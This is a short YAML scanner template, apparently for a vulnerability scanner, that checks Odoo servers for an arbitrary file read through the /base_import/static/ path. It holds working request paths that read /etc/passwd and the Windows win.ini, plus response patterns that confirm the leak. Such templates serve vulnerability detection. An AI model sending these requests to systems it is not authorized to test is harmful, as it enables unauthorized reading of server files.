expression: win0() || linux0()
id: odoo-file-read
info:
  author: amos1
  name: Odoo file read
  severity: high
rules:
  linux0:
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    request:
      method: GET
      path: /base_import/static/etc/passwd
  win0:
    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app
      support")
    request:
      method: GET
      path: /base_import/static/c:/windows/win.ini
